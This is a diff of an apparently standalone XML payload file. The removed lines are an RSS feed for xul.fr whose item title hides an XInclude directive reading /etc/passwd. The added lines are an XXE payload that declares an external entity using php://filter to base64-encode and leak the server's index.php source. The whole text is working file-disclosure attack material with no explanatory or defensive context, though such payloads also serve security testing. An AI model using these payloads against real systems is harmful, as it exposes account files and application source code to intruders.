@@ -1,23 +1,6 @@
-<?xml version="1.0" ?>
-<rss version="2.0">
-<channel>
-  <title>Ajax et XML</title>
-  <link>https://www.xul.fr/</link>
-  <description>L'interface graphique XML etc...</description>
-  <image>
-  <url>http:///www.xul.fr/xul-icon.gif</url>
-  <link>http:///www.xul.fr/index.php</link>
-   </image>
-   <item>
-      <title>Nouvelle  du jour</title>
-      <link>https://www.xul.fr/xml-rss.html</link> 
-      <description>Tout  savoir sur RSS</description>
-   </item>
-   <item>
-<title xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/></title>
-    <link>https://www.xul.fr/xml-rdf.php</link> 
-    <description>Et  tout savoir sur RDF</description>
-   </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE title [
+<!ELEMENT title ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
+]>
+<title>&xxe;</title>
